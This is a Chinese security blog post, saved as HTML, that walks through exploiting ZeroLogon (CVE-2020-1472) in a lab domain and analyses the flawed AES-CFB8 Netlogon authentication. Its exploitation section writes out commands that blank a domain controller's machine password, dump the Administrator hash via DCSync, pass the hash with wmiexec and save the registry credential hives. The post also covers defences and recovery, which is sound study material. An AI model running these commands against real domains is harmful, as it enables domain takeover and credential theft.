@@ -1,0 +1,355 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>ZeroLogon(CVE-2020-1472)利用以及分析 | 1jzz</title>
+<link rel="shortcut icon" href="https://1jzz.github.io/favicon.ico?v=1659229140591">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://1jzz.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="ZeroLogon(CVE-2020-1472)利用以及分析 | 1jzz - Atom Feed" href="https://1jzz.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="前置知识
+DCSync是什么
+在域环境中，不同域控制器之间，每15分钟会进行一次域数据同步。当一个域控制器想要从其他域控制器获取数据时，会发送一个GetNCChanges请求，该请求的数据包包括需要获取的数据。如果需要获取的数据过多则会分开..." />
+    <meta name="keywords" content="内网" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://1jzz.github.io">
+  <img class="avatar" src="https://1jzz.github.io/images/avatar.png?v=1659229140591" alt="">
+  </a>
+  <h1 class="site-title">
+    1jzz
+  </h1>
+  <p class="site-description">
+    当人生跌入谷底，剩下的每一步都是向上。
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              ZeroLogon(CVE-2020-1472)利用以及分析
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-05-14
+              </span>
+              <span>
+                12 min read
+              </span>
+              
+                <a href="https://1jzz.github.io/tag/qrjUTseS5/" class="post-tag">
+                  # 内网
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="前置知识">前置知识</h1>
+<h2 id="dcsync是什么">DCSync是什么</h2>
+<p>在域环境中，不同域控制器之间，每15分钟会进行一次域数据同步。当一个域控制器想要从其他域控制器获取数据时，会发送一个GetNCChanges请求，该请求的数据包包括需要获取的数据。如果需要获取的数据过多则会分开多个请求发送。DCSync就是利用这个原理，通过Directory Replication Service(DRS)服务的GetNCChanges接口向域控发起数据同步请求。<br>
+DCSync是与渗透中经常会用到的技术，其被整合在了Mimikatz中。在DCSync功能出现之前，要想获取与用于的哈希，需要登陆域控制器，在域控制器上执行代码才能获取域用户的哈希。<br>
+2015 年 8 月，Benjamin Delpy（神器 Mimikatz 的作者）和 Vincent Le Toux 发布了新版本的 Mimikatz，新增加了 DCSync 功能。该功能可以模仿一个域控制器，从真实的与控制器中请求数据，例如用户的哈希。该功能最大的特点就是不用登录域控制器，即可远程通过域数据同步复制的方式获取域控制器上的数据。<br>
+注意：DCSync攻击的对象如果是只读域控制器(RODC)，则会失效，因为RODC是不能参与复制数据到其他DC的。<br>
+在默认情况下，只有Administrators、Enterprise  Admins、Domain Contraollers和Domain Admins组内的用户有权限使用DCSync，但我们可以对域内用户添加ACL让普通用户也能调用DCSync。<br>
+可以使用Impacket中的secretsdump.py导出hash。<br>
+也可以导出krbtgt的hash制作黄金票据。</p>
+<h2 id="防御">防御</h2>
+<p>DCSync 攻击的原理是模拟域控制器与域控制器之间的数据同步复制。最好的防御方法是给控制器设置白名单，将可信任的资产设置在允许同步的白名单内。<br>
+除此之外，我们还应尝试枚举 Active Directory 中所有用户的 ACL 查询出所有特权帐户，检测域内被添加 DCSync 权限的用户。Github 上有一个项目 ACLight便提供了这样的功能，只需执行项目中的 Execute-ACLight2.bat，会列出所有具有特权的用户以及组：<br>
+<img src="https://1jzz.github.io/post-images/1652517893551.png" alt="" loading="lazy"></p>
+<h1 id="漏洞利用">漏洞利用</h1>
+<h2 id="定位域控">定位域控</h2>
+<ol>
+<li><code>net time</code>获取域控名称，或者<code>net group &quot;domain controllers&quot; /domain</code></li>
+<li>可以使用dns查询定位域控ip(ldap服务)</li>
+</ol>
+<p><code>nslookup –qt=ns de1ay.com</code><br>
+<code>Nslookup -type=SRV _ldap._tcp.de1ay.com</code></p>
+<ol start="3">
+<li>二层发现，端口扫描，如果开放53、389、135、445等端口则可能是域控</li>
+</ol>
+<h2 id="zerologon利用重置域控密码">zerologon利用(重置域控密码)</h2>
+<p>这里重置的是域控密码。注意，这里是域控密码，不是域管密码。是域控这个机器用户的密码。在域内，机器用户跟域用户一样，是域内的成员，它在域内的用户名是计算机名如LJZZ-2012，在本地的用户名是SYSTEM。<br>
+机器用户也是有密码的。只不过这个密码是随机生成的，密码强度是120个字符，无法爆破，而且会定时更新。<br>
+注册表<code>HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters</code>中，其中DisablePasswordChange(不更改密码)决定机器用户是否定时更新密码，默认是0，定时更新。MaximumPasswordAge决定机器用户更新的时间，默认是30天。<br>
+<img src="https://1jzz.github.io/post-images/1652517914718.png" alt="" loading="lazy"><br>
+<code>python3 cve-2020-1472-exploit.py -n ljzz-2012 1-t 92.168.6.1</code><br>
+<img src="https://1jzz.github.io/post-images/1652517943746.png" alt="" loading="lazy"><br>
+这一步会把域控LJZZ-2012用户的密码置为空，即NTLM hash为<code>31d6cfe0d16ae931b73c59d7e0c089c0</code><br>
+接下来使用空密码就可以进行Dcsync(因为是机器用户，不可以进行登录，但是因为域控的机器用户具备Dcsync特权，我们可以使用Dcsync)<br>
+使用impacket套件里面的secretsdump来进行DCSync利用：<br>
+<code>python secretsdump.py   ljzz.top/LJZZ-2012\$@192.168.6.1 -just-dc-user ljzz\\administrator -hashes 31d6cfe0d16ae931b73c59d7e0c089c0:31d6cfe0d16ae931b73c59d7e0c089c0</code><br>
+<img src="https://1jzz.github.io/post-images/1652517978971.png" alt="" loading="lazy"><br>
+以LJZZ-2012用户的DCSync权限dump出ljzz\Administrator用户的hash。<br>
+<code>aad3b435b51404eeaad3b435b51404ee:94fcd5d7b8b21c86b242fa3eedb0b05c</code></p>
+<h2 id="恢复脱域的域控">恢复脱域的域控</h2>
+<p>在攻击过程中，我们将机器用户LJZZ-2012的密码置为空，这一步是会导致域控hi脱域的。其原因是由于机器用户在AD中的密码(存储在ntds.dit)与lsass里面的密码不一致导致的。所以要将其恢复，我们将AD中的密码与lsass里面的密码保持一致就行。这里主要有三种方法。</p>
+<ol>
+<li>从lsass里面读取机器用户原先的密码，恢复AD里面的密码</li>
+</ol>
+<p>我们先通过wmi连接(需要开启rpc服务)然后直接通过reg save命令，将注册表里面的信息拿回本地，通过secretsdump提取出里面的hash。<br>
+<code>python wmiexec.py ljzz.top/administrator@192.168.6.1 -hashes aad3b435b51404eeaad3b435b51404ee:94fcd5d7b8b21c86b242fa3eedb0b05c</code><br>
+<code>reg save HKLM\SAM sam.save</code><br>
+<code>reg save HKLM\SYSTEM system.save</code><br>
+<code>reg save HKLM\SECURITY security.save</code><br>
+<code>get sam.save</code><br>
+<code>del /f sam.save</code><br>
+<code>secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</code><br>
+或者可以使用mimikatz的sekurlsa::logonpasswords从lsass里面进行抓取。<br>
+抓取到原来的hash之后可以使用reinstall_original_pw.py进行恢复hash。<br>
+恢复之前(为空密码)：<br>
+<img src="https://1jzz.github.io/post-images/1652518218105.png" alt="" loading="lazy"><br>
+<code>python3 reinstall_original_pw.py LJZZ-2012 192.168.6.1 717196339e80f6b6dda8a2320680911c</code><br>
+<img src="https://1jzz.github.io/post-images/1652517989967.png" alt="" loading="lazy"><br>
+恢复之后：<br>
+<img src="https://1jzz.github.io/post-images/1652518009570.png" alt="" loading="lazy"></p>
+<ol>
+<li>从ntds.dit里面读取AD历史密码，然后进行恢复</li>
+</ol>
+<figure data-type="image" tabindex="1"><img src="https://1jzz.github.io/post-images/1652518014837.png" alt="" loading="lazy"></figure>
+<ol start="2">
+<li>一次性重置计算机的机器帐户密码</li>
+</ol>
+<blockquote>
+<p>这里使用一个powershell 的cmdletReset-ComputerMachinePassword,他是微软在计算机脱域的情况下给出的一种解决方案。<br>
+可以一次性重置计算机的机器帐户密码。(包括AD，注册表，lsass里面的密码)。<br>
+我们用之前dcsync获取的域管权限登录域控。<br>
+执行<code>powershell Reset-ComputerMachinePassword</code></p>
+</blockquote>
+<figure data-type="image" tabindex="2"><img src="https://1jzz.github.io/post-images/1652518019225.png" alt="" loading="lazy"></figure>
+<p>虽然ljzz-2012$用户的hash已经改变了，但是AD、lsass中的hash已经保持一致了，所以就不会脱域了。<br>
+<img src="https://1jzz.github.io/post-images/1652518028930.png" alt="" loading="lazy"></p>
+<h1 id="漏洞分析">漏洞分析</h1>
+<h2 id="netlogon协议">Netlogon协议</h2>
+<p>Netlogon远程协议(也成为MS-NRPC)是一种RPC接口，由加入域的设备独占使用。MS-NRPC包括一种身份验证方法和一种建立Netlogon安全频道的方法。这些更新强制指定的Netlogon客户端行为将安全RPC与成员计算机和Active Directory(活动目录)、域控制器(DC)之间的Netlogon安全频道配合使用。<br>
+Netlogon&quot;网络登录&quot;系统服务维护计算机和域控制器之间的安全通道，对用户和服务进行身份验证。它将用户的凭据传递给域控制器，然后返回用户的域安全标识和用户权限。这通常成为pass-through身份验证。<br>
+认证过程：<br>
+<img src="https://1jzz.github.io/post-images/1652518386142.png" alt="" loading="lazy"></p>
+<ol>
+<li>客户端调用NetrServerReqChallenge向服务器发送一个Client Challenge</li>
+<li>服务端向客户端返回一个Server Challenge</li>
+<li>双方都利用client的hash、ClientChallenge、ServerChallenge计算一个session_key</li>
+<li>客户端利用session_key和ClientChallenge计算一个ClientCredential。并发送给服务端进行校验</li>
+<li>服务端也利用session_key和ClientChallenge去计算一个ClientCredential，如果值和客户端发送过来的一致，就让客户端通过认证</li>
+</ol>
+<p>这里计算ClietnChallenge使用ComputeNetlogonCredential函数。有两种算法，分别采用DES_ECB和AES_CFB。可以通过协商flag来选择哪一种加密方式。</p>
+<h2 id="aes_cfb8加密">AES_CFB8加密</h2>
+<p>黄色部分为IV，蓝色部分为明文。<br>
+简单说明一下加密过程，先是将上一轮的密文(第一次加密使用IV)进行AES加密，再与明文进行异或(e2^01=e3)得到密文e3，然后每次偏移一个字节(8bit)进行加密。可以看出这是一种流加密。<br>
+<img src="https://1jzz.github.io/post-images/1652518243526.png" alt="" loading="lazy"><br>
+CFB模式的加解密：<br>
+<img src="https://1jzz.github.io/post-images/1652518249169.png" alt="" loading="lazy"><br>
+<img src="https://1jzz.github.io/post-images/1652518256180.png" alt="" loading="lazy"></p>
+<h2 id="漏洞触发">漏洞触发</h2>
+<p>漏洞由于进行AES加密运算的过程中，使用了AES-CFB8模式并且错误的将IV设置为全0。凭证计算在ComputeNetlogonCredential函数中实现。<br>
+<img src="https://1jzz.github.io/post-images/1652518262057.png" alt="" loading="lazy"><br>
+那么在AES_CFB8加密过程中IV为零有什么缺陷呢？由于IV为零的话，分为两种情况。<br>
+第一种是正好传入的值为XY，<code>XY^AB(AES加密过后的前8位，可能不会相同)=00</code>，那么密文一直为全零，AES加密的值是一个固定的值(AB，也就是XY)，只要我们一直传入XY这个值，那么最后加密的数据就是00。<br>
+第二种则是正常的加密，但是因为缺失了IV的值，加密出来的值是固定的而不是随机的，只需要猜解key的值就可以破解。与XY进行异或出非00的数据，密文不断进行偏移，密文不再是第一种的不变的情况，而是固定的通过AES加密产生值与下一个传入的值进行异或。<br>
+该漏洞就是通过找到第一种中的XY，从而使传入的数据XYXYXYXY......=00000000......，因为8个bit的值有256种可能性，所以在尝试256次之后就可以找到XY的值，致使加密之后的值为全零。<br>
+<img src="https://1jzz.github.io/post-images/1652518354969.png" alt="" loading="lazy"><br>
+思路：</p>
+<ol>
+<li>只要我们向服务端发送一个ClientChallenge为0000......(XYXY......格式即可)</li>
+<li>因为Session_key是随机生成的(因为Server challenge是随机的)，然后传入AES_CFB8进行加密，对全零的IV加密过后其前8bit的值为00的话那么其密文就为全0</li>
+<li>我们不断向服务端发送ClientCredential为0000......(加密的结果)，直到经过AES加密(全零IV)过后的密文前8bit为0(通过session_key的随机生成进行加密)，那么就通过验证了</li>
+</ol>
+<h1 id="思考">思考</h1>
+<h2 id="为什么会造成脱域问题">为什么会造成脱域问题</h2>
+<p>最主要的原因是AD里面存储的机器密码跟本机的Lsass里面存储的密码不一定导致的。<br>
+正常情况下，AD运行正常。有一个DC和一个服务器。它们彼此信任是因为它们有一个共享的Secret——机器账户密码。它们可以使用它彼此通讯并建立加密通道。两台机器上的共享Secret是相同的。<br>
+<img src="https://1jzz.github.io/post-images/1652518419066.png" alt="" loading="lazy"><br>
+尝试登录服务器的用户可以通过带有服务票证的Kerberos进行登录。该服务票证由DC使用机器账户密码加密。服务器具有相同的Secret，可以解密票据并知道其合法性。用户获得访问权限。<br>
+<img src="https://1jzz.github.io/post-images/1652518424046.png" alt="" loading="lazy"><br>
+借助Zerologon攻击，攻击者可以更改AD中计算机账户的密码，从而修改了secret的值。现在，服务器无法使用机器账户与DC建立连接。在大多数情况下，服务器仍将具有有效的Kerberos票证，因此某些登录仍将起作用(其他域用户)。<br>
+<img src="https://1jzz.github.io/post-images/1652518429239.png" alt="" loading="lazy"><br>
+在漏洞利用之前发出的Kerberos票证仍然可以使用，但是新的票证将由AD使用新密钥（以蓝色显示）进行加密。服务器无法解密(因为使用了Lsass里面的密码hash去进行解密，因为和加密用的hash不一致这些文件并抛出错误。后续Kerberos登录也随即无效。<br>
+<img src="https://1jzz.github.io/post-images/1652518436642.png" alt="" loading="lazy"><br>
+NTLM的登录也不行，因为使用AD帐户登录已通过安全通道（通过相同的netlogon协议zerologon滥用）在DC上进行了验证。<br>
+但是无法建立此通道，因为信任中断，并且服务器再次引发错误。<br>
+<img src="https://1jzz.github.io/post-images/1652518443348.png" alt="" loading="lazy"><br>
+像服务器一样，DC拥有一个带有密码的机器帐户，该帐户以加密方式存储在注册表中。引导时将其加载到lsass中。如果我们使用Zerologon更改密码，则仅AD中的密码会更改，而不是注册表或lsass中的密码。<br>
+<img src="https://1jzz.github.io/post-images/1652518449652.png" alt="" loading="lazy"><br>
+漏洞利用后，每当发出新的 Kerberos 票证时，我们都会遇到与服务器相同的问题。DC 无法使用 lsass 中的机器账号密码解密服务票证，使用 Kerberos 的身份验证中断。<br>
+<img src="https://1jzz.github.io/post-images/1652518455301.png" alt="" loading="lazy"><br>
+对于NTLM，则有所不同。在DC上，似乎没有使用计算机帐户，但是通过另一种方式（我尚未调查过）验证了NTLM登录，该方式仍然有效。<br>
+<img src="https://1jzz.github.io/post-images/1652518465336.png" alt="" loading="lazy"><br>
+如果您真的想使用Kerberos，我想（未经测试）它可以与2个DC一起使用。 DC之间的同步可能会保持一段时间，因为Kerberos票证仍然有效。<br>
+因此，一旦将DC1的新密码同步到DC2，就可以使用DC1的帐户与DC1同步。<br>
+<img src="https://1jzz.github.io/post-images/1652518471924.png" alt="" loading="lazy"></p>
+<h2 id="iv不全为零就不会有危害了吗">IV不全为零就不会有危害了吗</h2>
+<p>可以看到，在进行加密的过程中上一轮的密文都是不变的，导致加密后的结果固定，所以存在一个XY值可以使密文固定。<br>
+因此在密文不断变化的过程中，保持不变的话就可以进行猜解。例如：<br>
+IV:18181818，在AES加密之后前8个bit的值与传入的XY异或相差18，那么密文就为18，IV还是18181818。</p>
+<h1 id="总结">总结</h1>
+<ol>
+<li>重置密码利用分析就看的比较蒙，缺少了很多windows基础，也没有能力去自己分析</li>
+</ol>
+<h1 id="参考">参考</h1>
+<p><a href="https://www.anquanke.com/post/id/219374">https://www.anquanke.com/post/id/219374</a><br>
+<a href="https://cert.360.cn/report/detail?id=2e904ef9ac96834a3dd7fc058cea4fe5">https://cert.360.cn/report/detail?id=2e904ef9ac96834a3dd7fc058cea4fe5</a><br>
+<a href="https://twitter.com/_dirkjan/status/1306280553281449985">https://twitter.com/_dirkjan/status/1306280553281449985</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86">前置知识</a>
+<ul>
+<li><a href="#dcsync%E6%98%AF%E4%BB%80%E4%B9%88">DCSync是什么</a></li>
+<li><a href="#%E9%98%B2%E5%BE%A1">防御</a></li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">漏洞利用</a>
+<ul>
+<li><a href="#%E5%AE%9A%E4%BD%8D%E5%9F%9F%E6%8E%A7">定位域控</a></li>
+<li><a href="#zerologon%E5%88%A9%E7%94%A8%E9%87%8D%E7%BD%AE%E5%9F%9F%E6%8E%A7%E5%AF%86%E7%A0%81">zerologon利用(重置域控密码)</a></li>
+<li><a href="#%E6%81%A2%E5%A4%8D%E8%84%B1%E5%9F%9F%E7%9A%84%E5%9F%9F%E6%8E%A7">恢复脱域的域控</a></li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</a>
+<ul>
+<li><a href="#netlogon%E5%8D%8F%E8%AE%AE">Netlogon协议</a></li>
+<li><a href="#aes_cfb8%E5%8A%A0%E5%AF%86">AES_CFB8加密</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91">漏洞触发</a></li>
+</ul>
+</li>
+<li><a href="#%E6%80%9D%E8%80%83">思考</a>
+<ul>
+<li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E9%80%A0%E6%88%90%E8%84%B1%E5%9F%9F%E9%97%AE%E9%A2%98">为什么会造成脱域问题</a></li>
+<li><a href="#iv%E4%B8%8D%E5%85%A8%E4%B8%BA%E9%9B%B6%E5%B0%B1%E4%B8%8D%E4%BC%9A%E6%9C%89%E5%8D%B1%E5%AE%B3%E4%BA%86%E5%90%97">IV不全为零就不会有危害了吗</a></li>
+</ul>
+</li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+<li><a href="#%E5%8F%82%E8%80%83">参考</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://1jzz.github.io/post/fk8TQLvr8/">
+              <h3 class="post-title">
+                Commons Collections利用链
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  友链： <a href="https://www.cnblogs.com/sherlson/" target="_blank">sherlson</a>、<a href="https://cyberczy.github.io/" target="_blank">cyberczy</a>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?d4b50d1451bf48cde435f45724be67b3";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+  <a class="rss" href="https://1jzz.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
